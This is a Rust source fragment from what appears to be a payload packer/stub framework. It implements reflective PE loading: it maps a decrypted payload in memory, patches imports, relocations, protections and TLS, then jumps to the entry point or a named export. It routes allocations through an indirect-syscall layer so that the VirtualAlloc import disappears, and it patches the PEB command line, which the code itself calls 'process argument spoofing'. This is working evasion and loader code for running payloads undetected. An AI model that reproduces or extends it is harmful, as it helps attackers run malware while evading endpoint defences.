// --- Reflective loading (technique fragment) ---

use std::ffi::{c_void, CStr};
use std::ptr;

use windows::Win32::Foundation::{BOOL, HINSTANCE};
use windows::Win32::System::Diagnostics::Debug::{
    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT,
    IMAGE_DIRECTORY_ENTRY_TLS, IMAGE_FILE_DLL, IMAGE_SECTION_HEADER,
};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
    PAGE_READWRITE,
};
use windows::Win32::System::SystemServices::{
    DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE,
    IMAGE_NT_SIGNATURE, IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH,
    IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_LOW, PIMAGE_TLS_CALLBACK,
};
use windows::Win32::System::Threading::{GetCurrentProcess, TlsAlloc};

/// Entry point signature of a mapped EXE (returns the process exit code).
type ExeEntryPoint = unsafe extern "system" fn() -> u32;

/// Entry point signature of a mapped DLL (DllMain).
type DllEntryPoint = unsafe extern "system" fn(HINSTANCE, u32, *mut c_void) -> BOOL;

/// The image's NT headers, for the architecture the stub is built for.
#[cfg(target_arch = "x86_64")]
type NtHeaders = windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
#[cfg(target_arch = "x86")]
type NtHeaders = windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;

/// The optional-header magic the payload must have: PE32+ for an x64 stub,
/// PE32 for an x86 one (the packer enforces the same rule at build time).
#[cfg(target_arch = "x86_64")]
const EXPECTED_MAGIC: u16 = 0x20b;
#[cfg(target_arch = "x86")]
const EXPECTED_MAGIC: u16 = 0x10b;

/// `IMAGE_TLS_DIRECTORY` for the stub's architecture. The 32-bit layout is
/// defined by hand: the `windows` crate only exposes the 64-bit one, and the
/// field names match it so the provisioning code stays shared.
#[cfg(target_arch = "x86_64")]
type TlsDirectory = windows::Win32::System::SystemServices::IMAGE_TLS_DIRECTORY64;
#[cfg(target_arch = "x86")]
#[repr(C)]
#[allow(non_snake_case)]
struct TlsDirectory {
    StartAddressOfRawData: u32,
    EndAddressOfRawData: u32,
    AddressOfIndex: u32,
    AddressOfCallBacks: u32,
    SizeOfZeroFill: u32,
    Characteristics: u32,
}
/// Errors produced while reflectively loading a PE.
#[derive(Debug, thiserror::Error)]
enum ReflectiveLoadingError {
    #[error("file too small to be a valid PE")]
    FileTooSmall,
    #[error("invalid DOS signature (expected MZ)")]
    InvalidDosSignature,
    #[error("invalid NT signature (expected PE)")]
    InvalidNtSignature,
    #[error("the payload's architecture does not match the stub's (magic 0x{0:04x})")]
    UnsupportedArchitecture(u16),
    #[error("failed to allocate image memory (error {0})")]
    AllocateFailed(u32),
    #[error("section '{section}' is out of file bounds")]
    SectionOutOfBounds { section: String },
    /// The payload's import table could not be resolved (see
    /// `engine::imports`).
    #[error(transparent)]
    Imports(#[from] crate::ImportError),
    #[error("could not change protection for section '{section}' (error {error})")]
    VirtualProtectFailed { section: String, error: u32 },
    #[error("could not provision the payload's TLS (no index or no memory)")]
    TlsUnavailable,
    /// `build.payloads.<name>.export` names a symbol the payload does not export.
    #[error("the payload does not export '{name}'")]
    ExportNotFound { name: String },
}

/// `TlsAlloc`'s failure value.
const TLS_OUT_OF_INDEXES: u32 = u32::MAX;

/// `TEB->ThreadLocalStoragePointer`: the per-thread array of module TLS blocks
/// that a CRT reads through `_tls_index`. `gs:[0x58]` on x64, `fs:[0x2C]` on x86.
///
/// `TlsAlloc`/`TlsSetValue` do **not** write it: they use `TEB->TlsSlots`
/// (`gs:[0x1480]` / `fs:[0xE10]`), a different array. Pointing a mapped image's
/// `_tls_index` at a `TlsSetValue` slot therefore leaves it reading another
/// module's block — measured, on both architectures, before this was fixed.
#[cfg(target_arch = "x86_64")]
const TEB_TLS_ARRAY_OFFSET: u32 = 0x58;
#[cfg(target_arch = "x86")]
const TEB_TLS_ARRAY_OFFSET: u32 = 0x2C;

/// The PEB in the TEB: `gs:[0x60]` on x64, `fs:[0x30]` on x86.
#[cfg(target_arch = "x86_64")]
const PEB_TEB_OFFSET: u32 = 0x60;
#[cfg(target_arch = "x86")]
const PEB_TEB_OFFSET: u32 = 0x30;

/// `PEB->Ldr`.
#[cfg(target_arch = "x86_64")]
const PEB_LDR_OFFSET: usize = 0x18;
#[cfg(target_arch = "x86")]
const PEB_LDR_OFFSET: usize = 0x0C;

/// `LDR_DATA_TABLE_ENTRY::InLoadOrderLinks` and `::DllBase`.
#[cfg(target_arch = "x86_64")]
const LDR_IN_LOAD_ORDER_OFFSET: usize = 0x10;
#[cfg(target_arch = "x86")]
const LDR_IN_LOAD_ORDER_OFFSET: usize = 0x0C;
#[cfg(target_arch = "x86_64")]
const LDR_DLL_BASE_OFFSET: usize = 0x30;
#[cfg(target_arch = "x86")]
const LDR_DLL_BASE_OFFSET: usize = 0x18;

/// `IMAGE_OPTIONAL_HEADER::NumberOfRvaAndSizes` and `::DataDirectory`, which
/// sit at different offsets in PE32 and PE32+.
#[cfg(target_arch = "x86_64")]
const NUM_DIRECTORIES_OFFSET: usize = 108;
#[cfg(target_arch = "x86")]
const NUM_DIRECTORIES_OFFSET: usize = 92;
#[cfg(target_arch = "x86_64")]
const DATA_DIRECTORY_OFFSET: usize = 112;
#[cfg(target_arch = "x86")]
const DATA_DIRECTORY_OFFSET: usize = 96;

/// `IMAGE_DIRECTORY_ENTRY_TLS`.
const TLS_DIRECTORY_INDEX: usize = 9;

/// `IMAGE_TLS_DIRECTORY::AddressOfIndex`: after two pointer-sized addresses,
/// so 8 in PE32 and 16 in PE32+.
#[cfg(target_arch = "x86_64")]
const TLS_INDEX_FIELD_OFFSET: usize = 16;
#[cfg(target_arch = "x86")]
const TLS_INDEX_FIELD_OFFSET: usize = 8;

/// A base relocation entry (type + offset packed in a `u16`).
#[repr(C)]
struct BaseRelocationEntry {
    data: u16,
}

impl BaseRelocationEntry {
    fn offset(&self) -> u16 {
        self.data & 0x0FFF
    }

    fn type_(&self) -> u16 {
        self.data >> 12
    }
}

/// Reflectively loads `payload` in the current process and returns the exit
/// code of its entry point.
///
/// When `export` is set (`build.payloads.<name>.export`, only meaningful for
/// `format: dll`), that exported function is called instead of the image's
/// entry point: a mapped DLL's `DllMain` only initializes the library, so a
/// named export is how a DLL payload does real work.
///
/// # Safety
/// `payload` must point to a valid, readable x64 PE image for the whole call.
/// The payload is executed in-process, so its code runs with the stub's
/// privileges.
pub unsafe fn run_reflective(
    payload: &[u8],
    export: Option<&str>,
) -> Result<i32, ReflectiveLoadingError> {
    let (_dos, nt) = get_headers(payload)?;
    let is_dll = (*nt).FileHeader.Characteristics.0 & IMAGE_FILE_DLL.0 != 0;
    crate::tech_dbg!(
        "reflective_loading",
        "payload {} bytes (dll={is_dll})",
        payload.len()
    );

    let image_base = allocate_image(nt)?;
    crate::tech_dbg!("reflective_loading", "image mapped at {image_base:p}");
    copy_headers(payload, image_base, nt)?;
    copy_sections(payload, image_base, nt)?;
    crate::tech_dbg!("reflective_loading", "headers and sections copied");
    fix_imports(image_base, nt)?;
    fix_relocations(image_base, nt)?;
    crate::tech_dbg!("reflective_loading", "relocations applied");
    fix_memory_protections(image_base, nt)?;
    crate::tech_dbg!("reflective_loading", "section protections applied");
    // The loader would have provisioned TLS before running any payload code;
    // `TlsSetValue` below only reaches the calling thread, so the payload runs
    // on this one too (see `execute_entrypoint`).
    provision_tls(image_base, nt)?;
    crate::tech_dbg!("reflective_loading", "TLS provisioned on the current thread");

    if let Some(name) = export {
        // Initialize the library first: a mapped DLL's CRT/global constructors
        // run from `DllMain(DLL_PROCESS_ATTACH)`, which the OS loader would
        // normally call. Skipping it leaves an export that touches the CRT
        // running against uninitialized state.
        if is_dll {
            crate::tech_dbg!("reflective_loading", "running DllMain(DLL_PROCESS_ATTACH)");
            call_dll_main(image_base, nt);
        }
        let address = resolve_export(image_base, nt, name)
            .ok_or_else(|| ReflectiveLoadingError::ExportNotFound {
                name: name.to_string(),
            })?;
        crate::tech_dbg!("reflective_loading", "calling export '{name}' at 0x{address:x}");
        call_export(address);
        return Ok(0);
    }

    execute_entrypoint(image_base, nt, is_dll)
}

/// Validates the PE and returns pointers to its DOS and NT headers.
fn get_headers(
    payload: &[u8],
) -> Result<(*const IMAGE_DOS_HEADER, *const NtHeaders), ReflectiveLoadingError> {
    if payload.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
        return Err(ReflectiveLoadingError::FileTooSmall);
    }

    unsafe {
        let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return Err(ReflectiveLoadingError::InvalidDosSignature);
        }

        let nt = (dos as usize + (*dos).e_lfanew as usize) as *const NtHeaders;
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return Err(ReflectiveLoadingError::InvalidNtSignature);
        }

        // The packer already rejects a payload whose arch differs from
        // `build.output.arch`, but keep a defensive check here.
        let magic = (*nt).OptionalHeader.Magic.0;
        if magic != EXPECTED_MAGIC {
            return Err(ReflectiveLoadingError::UnsupportedArchitecture(magic));
        }

        Ok((dos, nt))
    }
}

/// Allocates the image at its preferred base (falling back to any address).
/// The allocation goes through the syscall layer's `nt_alloc_vm`, so
/// `mode: indirect` removes the `VirtualAlloc` import.
fn allocate_image(nt: *const NtHeaders) -> Result<*mut c_void, ReflectiveLoadingError> {
    unsafe {
        let size = (*nt).OptionalHeader.SizeOfImage as usize;
        let preferred = (*nt).OptionalHeader.ImageBase as usize;

        let process = GetCurrentProcess();
        let mut base = preferred as *mut c_void;
        let mut region = size;
        let mut status = crate::nt_alloc_vm(
            process,
            &mut base,
            0,
            &mut region,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 {
            base = ptr::null_mut();
            region = size;
            status = crate::nt_alloc_vm(
                process,
                &mut base,
                0,
                &mut region,
                MEM_COMMIT.0 | MEM_RESERVE.0,
                PAGE_READWRITE.0,
            );
        }
        if status < 0 {
            return Err(ReflectiveLoadingError::AllocateFailed(status as u32));
        }

        Ok(base)
    }
}

fn copy_headers(
    payload: &[u8],
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), ReflectiveLoadingError> {
    unsafe {
        let size = (*nt).OptionalHeader.SizeOfHeaders as usize;
        ptr::copy_nonoverlapping(payload.as_ptr(), image_base as *mut u8, size);
    }
    Ok(())
}

fn copy_sections(
    payload: &[u8],
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), ReflectiveLoadingError> {
    unsafe {
        let section_header = (nt as usize + std::mem::size_of::<NtHeaders>())
            as *const IMAGE_SECTION_HEADER;
        let num = (*nt).FileHeader.NumberOfSections as usize;

        for i in 0..num {
            let section = section_header.add(i);
            let raw_size = (*section).SizeOfRawData as usize;
            if raw_size == 0 {
                continue;
            }

            let src = (*section).PointerToRawData as usize;
            let dst = image_base as usize + (*section).VirtualAddress as usize;
            if src + raw_size > payload.len() {
                return Err(ReflectiveLoadingError::SectionOutOfBounds {
                    section: section_name(section),
                });
            }
            ptr::copy_nonoverlapping(payload.as_ptr().add(src), dst as *mut u8, raw_size);
        }
    }
    Ok(())
}

/// Reads a section's (not necessarily NUL-terminated) name.
unsafe fn section_name(section: *const IMAGE_SECTION_HEADER) -> String {
    let name = &(*section).Name;
    let end = name.iter().position(|&b| b == 0).unwrap_or(name.len());
    String::from_utf8_lossy(&name[..end]).into_owned()
}

fn fix_imports(
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), ReflectiveLoadingError> {
    unsafe {
        let import_dir =
            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize];
        if import_dir.Size == 0 || import_dir.VirtualAddress == 0 {
            return Ok(());
        }

        // The mapped image has RVA == offset from `image_base`. `patch_imports`
        // resolves the table, serves catalogue hits from `resolution_policy`,
        // and makes the IAT writable only while it writes (the loader maps it
        // read-only).
        let view = std::slice::from_raw_parts_mut(
            image_base as *mut u8,
            (*nt).OptionalHeader.SizeOfImage as usize,
        );
        let count = crate::patch_imports(
            view,
            import_dir.VirtualAddress,
            import_dir.Size,
            crate::resolution_policy,
        )?;
        crate::tech_dbg!("reflective_loading", "IAT patched ({count} import(s))");
    }
    Ok(())
}

fn fix_relocations(
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), ReflectiveLoadingError> {
    unsafe {
        let reloc_dir =
            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize];
        if reloc_dir.Size == 0 || reloc_dir.VirtualAddress == 0 {
            return Ok(());
        }

        let preferred = (*nt).OptionalHeader.ImageBase as isize;
        let delta = image_base as isize - preferred;
        if delta == 0 {
            return Ok(());
        }

        let mut block = (image_base as usize + reloc_dir.VirtualAddress as usize)
            as *const IMAGE_BASE_RELOCATION;
        while (*block).VirtualAddress != 0 {
            let block_size = (*block).SizeOfBlock as usize;
            let count = (block_size - std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                / std::mem::size_of::<u16>();
            let entries = (block as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                as *const BaseRelocationEntry;

            for i in 0..count {
                let entry = entries.add(i);
                let target = (image_base as usize
                    + (*block).VirtualAddress as usize
                    + (*entry).offset() as usize) as *mut isize;

                match (*entry).type_() as u32 {
                    IMAGE_REL_BASED_ABSOLUTE => {}
                    IMAGE_REL_BASED_DIR64 => {
                        *target += delta;
                    }
                    IMAGE_REL_BASED_HIGHLOW => {
                        let target32 = target as *mut u32;
                        *target32 = (*target32 as isize + delta) as u32;
                    }
                    IMAGE_REL_BASED_HIGH => {
                        let target16 = target as *mut u16;
                        *target16 = (*target16 as isize + (delta >> 16)) as u16;
                    }
                    IMAGE_REL_BASED_LOW => {
                        let target16 = target as *mut u16;
                        *target16 = (*target16 as isize + (delta & 0xFFFF)) as u16;
                    }
                    _ => {}
                }
            }

            block = (block as usize + block_size) as *const IMAGE_BASE_RELOCATION;
        }
    }
    Ok(())
}

fn fix_memory_protections(
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), ReflectiveLoadingError> {
    unsafe {
        let section_header = (nt as usize + std::mem::size_of::<NtHeaders>())
            as *const IMAGE_SECTION_HEADER;
        let num = (*nt).FileHeader.NumberOfSections as usize;

        for i in 0..num {
            let section = section_header.add(i);
            let characteristics = (*section).Characteristics.0;
            let protection = if characteristics & 0x2000_0000 != 0 {
                // IMAGE_SCN_MEM_EXECUTE
                if characteristics & 0x8000_0000 != 0 {
                    PAGE_EXECUTE_READWRITE
                } else {
                    PAGE_EXECUTE_READ
                }
            } else if characteristics & 0x8000_0000 != 0 {
                PAGE_READWRITE
            } else {
                PAGE_READONLY
            };

            let address =
                (image_base as usize + (*section).VirtualAddress as usize) as *const c_void;
            let size = (*section).Misc.VirtualSize as usize;
            if size > 0 {
                let mut old = 0u32;
                let status = crate::nt_protect_vm(
                    GetCurrentProcess(),
                    address as *mut core::ffi::c_void,
                    size,
                    protection.0,
                    &mut old,
                );
                if status < 0 {
                    return Err(ReflectiveLoadingError::VirtualProtectFailed {
                        section: section_name(section),
                        error: status as u32,
                    });
                }
            }
        }
    }
    Ok(())
}

/// Provisions the payload's TLS the way the loader would, then runs its
/// `DLL_PROCESS_ATTACH` callbacks.
///
/// A manually mapped image never gets a TLS index from the OS: the module's
/// `_tls_index` (the DWORD `AddressOfIndex` points at)
/// stays zero and no thread's TLS slot is ever filled in. The CRT reads its
/// per-thread state through that index, so a Rust (or otherwise CRT-using)
/// payload fast-fails with `STATUS_STACK_BUFFER_OVERRUN` on its first
/// thread-local access. This allocates an index, materializes the `.tls`
/// template in a private block and points the calling thread's slot at it.
///
/// The slot lives in the loader's array ([`TEB_TLS_ARRAY_OFFSET`]) — the one a
/// CRT actually reads; `TlsSetValue` writes a different one, which left the
/// payload reading another module's block (measured). The index still has to
/// come from `TlsAlloc`, because the reservation it makes is what the thread's
/// teardown expects: an entry whose index the process does not claim is torn
/// down as garbage when the thread exits (ntdll reads the block header at
/// `block - 8`; measured on both architectures). The index `TlsAlloc` returns
/// can coincide with a loaded module's — see the limitation below.
///
/// Limitations:
///
/// - TLS slots are per thread. Threads the payload creates itself get a zeroed
///   slot for this index, so a payload that spawns threads and touches
///   thread-local state on them needs a TLS-aware thread trampoline (out of
///   scope).
/// - When the index coincides with a loaded module's, that module's
///   thread-locals in *this* thread are the payload's template bytes. Which
///   index that is depends on the host process; `build.stub.debug` logs it.
/// - A module the payload loads *later* can be handed the same index, which
///   replaces the block; payloads that load TLS-using DLLs are out of scope.
fn provision_tls(
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), ReflectiveLoadingError> {
    unsafe {
        let tls_dir = (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS.0 as usize];
        if tls_dir.Size == 0 || tls_dir.VirtualAddress == 0 {
            return Ok(());
        }

        let tls =
            (image_base as usize + tls_dir.VirtualAddress as usize) as *const TlsDirectory;
        let callbacks = (*tls).AddressOfCallBacks as *const PIMAGE_TLS_CALLBACK;
        let index_field = (*tls).AddressOfIndex as *mut u32;
        let raw_start = (*tls).StartAddressOfRawData as usize;
        let raw_len = ((*tls).EndAddressOfRawData as usize).saturating_sub(raw_start);
        let zero_fill = (*tls).SizeOfZeroFill as usize;

        if !index_field.is_null() && raw_len + zero_fill > 0 {
            let array = tls_array();
            if array.is_null() {
                return Err(ReflectiveLoadingError::TlsUnavailable);
            }
            let index = TlsAlloc();
            if index == TLS_OUT_OF_INDEXES {
                return Err(ReflectiveLoadingError::TlsUnavailable);
            }
            if used_module_tls_indices().contains(&index) {
                crate::tech_dbg!(
                    "reflective_loading",
                    "payload TLS index {index} is also a loaded module's"
                );
            }
            // What the payload's CRT reads as `_tls_index`.
            *index_field = index;

            // Enough for the template plus the zero-filled tail; the loader
            // gives every thread its own copy, so thread-locals start at their
            // image-initialized values.
            let mut block = ptr::null_mut();
            let mut size = raw_len + zero_fill;
            let status = crate::nt_alloc_vm(
                GetCurrentProcess(),
                &mut block,
                0,
                &mut size,
                MEM_COMMIT.0 | MEM_RESERVE.0,
                PAGE_READWRITE.0,
            );
            if status < 0 || block.is_null() {
                return Err(ReflectiveLoadingError::TlsUnavailable);
            }
            if raw_len > 0 {
                ptr::copy_nonoverlapping(raw_start as *const u8, block as *mut u8, raw_len);
            }
            // The slot holds a pointer to the per-thread block — the write the
            // loader makes for every module TLS entry of the thread.
            array.add(index as usize).write(block);
            crate::tech_dbg!(
                "reflective_loading",
                "payload TLS index {index} ({} bytes)",
                raw_len + zero_fill
            );
        }

        if !callbacks.is_null() {
            let mut i = 0usize;
            while let Some(callback) = *callbacks.add(i) {
                callback(image_base, DLL_PROCESS_ATTACH, ptr::null_mut());
                i += 1;
            }
        }
    }
    Ok(())
}

/// The calling thread's `ThreadLocalStoragePointer` array — the one a CRT
/// indexes with `_tls_index`.
unsafe fn tls_array() -> *mut *mut c_void {
    let array: *mut *mut c_void;
    #[cfg(target_arch = "x86_64")]
    core::arch::asm!(
        "mov {}, gs:[{}]",
        out(reg) array,
        const TEB_TLS_ARRAY_OFFSET,
        options(nostack, preserves_flags, readonly)
    );
    #[cfg(target_arch = "x86")]
    core::arch::asm!(
        "mov {}, fs:[{}]",
        out(reg) array,
        const TEB_TLS_ARRAY_OFFSET,
        options(nostack, preserves_flags, readonly)
    );
    array
}

/// The current process's PEB.
unsafe fn current_peb() -> *const u8 {
    let peb: *const u8;
    #[cfg(target_arch = "x86_64")]
    core::arch::asm!(
        "mov {}, gs:[{}]",
        out(reg) peb,
        const PEB_TEB_OFFSET,
        options(nostack, preserves_flags, readonly)
    );
    #[cfg(target_arch = "x86")]
    core::arch::asm!(
        "mov {}, fs:[{}]",
        out(reg) peb,
        const PEB_TEB_OFFSET,
        options(nostack, preserves_flags, readonly)
    );
    peb
}

/// The `_tls_index` of every module the process has loaded (skipping the ones
/// without a TLS directory). Used only for the diagnostic that reports an index
/// collision.
unsafe fn used_module_tls_indices() -> Vec<u32> {
    let mut used = Vec::new();
    let peb = current_peb();
    if peb.is_null() {
        return used;
    }
    let ldr = peb.add(PEB_LDR_OFFSET).cast::<*const u8>().read();
    if ldr.is_null() {
        return used;
    }

    let head = ldr.add(LDR_IN_LOAD_ORDER_OFFSET);
    let mut entry = head.cast::<*const u8>().read();
    let mut guard = 0u32;
    while !entry.is_null() && entry != head && guard < 256 {
        guard += 1;
        let base = entry.add(LDR_DLL_BASE_OFFSET).cast::<*const u8>().read() as usize;
        if let Some(index) = module_tls_index(base) {
            used.push(index);
        }
        entry = entry.cast::<*const u8>().read();
    }
    used
}

/// Reads a loaded module's `_tls_index` out of its PE headers (`None` when the
/// module has no TLS directory).
unsafe fn module_tls_index(base: usize) -> Option<u32> {
    if base == 0 {
        return None;
    }
    let e_lfanew = *((base + 0x3C) as *const u32) as usize;
    if e_lfanew == 0 || e_lfanew > 0x1000 {
        return None;
    }
    let optional = base + e_lfanew + 4 + 20;
    if *((optional + NUM_DIRECTORIES_OFFSET) as *const u32) as usize <= TLS_DIRECTORY_INDEX {
        return None;
    }
    let tls_rva =
        *((optional + DATA_DIRECTORY_OFFSET + TLS_DIRECTORY_INDEX * 8) as *const u32) as usize;
    if tls_rva == 0 {
        return None;
    }
    // `AddressOfIndex` is a VA: pointer-sized in both PE32 and PE32+.
    let index_va = *((base + tls_rva + TLS_INDEX_FIELD_OFFSET) as *const usize);
    if index_va == 0 {
        return None;
    }
    Some(*((index_va) as *const u32))
}

/// Runs the payload's entry point on this thread and returns its exit code.
///
/// The payload keeps the stub's thread (rather than getting a fresh one): the
/// TLS slot provisioned above belongs to the calling thread, and the payload's
/// CRT reads it from there. A payload that calls `ExitProcess` ends the process,
/// exactly as it would from a thread it created itself.
fn execute_entrypoint(
    image_base: *mut c_void,
    nt: *const NtHeaders,
    is_dll: bool,
) -> Result<i32, ReflectiveLoadingError> {
    if is_dll {
        crate::tech_dbg!("reflective_loading", "running DllMain(DLL_PROCESS_ATTACH)");
        call_dll_main(image_base, nt);
        return Ok(0);
    }

    let entry_point = image_base as usize + unsafe { (*nt).OptionalHeader.AddressOfEntryPoint } as usize;
    crate::tech_dbg!(
        "reflective_loading",
        "jumping to entry point 0x{entry_point:x}"
    );
    // SAFETY: `entry_point` is the payload's `AddressOfEntryPoint`, copied into
    // executable memory with a matching ABI by the mapping steps above.
    let exe_main: ExeEntryPoint = unsafe { std::mem::transmute(entry_point) };
    let code = unsafe { exe_main() } as i32;
    crate::tech_dbg!("reflective_loading", "payload returned {code}");
    Ok(code)
}

/// The export directory, as laid out in the mapped image. Defined by hand so
/// the fragment does not depend on the `windows` crate exposing it.
#[repr(C)]
struct ExportDirectory {
    characteristics: u32,
    timestamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

/// Resolves an exported symbol by name in an already-mapped image (RVA ==
/// offset from `image_base`).
fn resolve_export(
    image_base: *mut c_void,
    nt: *const NtHeaders,
    wanted: &str,
) -> Option<usize> {
    unsafe {
        let dir = (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.0 as usize];
        if dir.VirtualAddress == 0 || dir.Size == 0 {
            return None;
        }

        let base = image_base as usize;
        let export = (base + dir.VirtualAddress as usize) as *const ExportDirectory;
        let names = (base + (*export).address_of_names as usize) as *const u32;
        let functions = (base + (*export).address_of_functions as usize) as *const u32;
        let ordinals = (base + (*export).address_of_name_ordinals as usize) as *const u16;

        for i in 0..(*export).number_of_names as usize {
            let name_rva = *names.add(i);
            let name_ptr = (base + name_rva as usize) as *const i8;
            if CStr::from_ptr(name_ptr).to_bytes() == wanted.as_bytes() {
                let ordinal = *ordinals.add(i) as usize;
                return Some(base + *functions.add(ordinal) as usize);
            }
        }
        None
    }
}

/// Calls an exported function that takes no arguments.
fn call_export(address: usize) {
    // SAFETY: `address` is an exported function inside the mapped payload. The
    // export is invoked with no arguments; payloads that need run-time arguments
    // are out of scope (see the technique README).
    let entry: unsafe extern "system" fn() = unsafe { std::mem::transmute(address) };
    unsafe { entry() };
}

/// Runs the mapped DLL's entry point once with `DLL_PROCESS_ATTACH`, the way
/// the loader would, so the payload's CRT and global constructors initialize
/// before an export is called.
fn call_dll_main(image_base: *mut c_void, nt: *const NtHeaders) {
    unsafe {
        let entry = image_base as usize + (*nt).OptionalHeader.AddressOfEntryPoint as usize;
        if entry == image_base as usize {
            return;
        }
        // SAFETY: `entry` is the mapped image's entry point, copied into
        // executable memory with matching ABI (`DllMain`).
        let dll_main: DllEntryPoint = unsafe { std::mem::transmute(entry) };
        let _ = dll_main(
            HINSTANCE(image_base as *mut c_void),
            DLL_PROCESS_ATTACH,
            ptr::null_mut(),
        );
    }
}

/// Adapter expected by the stub skeleton (`run()` calls this with the
/// decrypted payload).
fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    // The payload runs in *this* process and reads its command line from the
    // PEB (`GetCommandLineW`). Repoint it at `<exe> <yaml args> <runtime
    // args>` first, so the payload receives its arguments instead of the
    // stub's own command line (process argument spoofing).
    crate::patch_command_line()?;
    // `build.payloads.<name>.export`: a DLL export to call instead of the entry point.
    let export: Option<String> = $DLL_EXPORT_DEF$;
    // SAFETY: `image` is the decrypted, valid x64 PE produced by the packer.
    unsafe { run_reflective(image, export.as_deref()) }.map_err(|e| e.to_string())
}
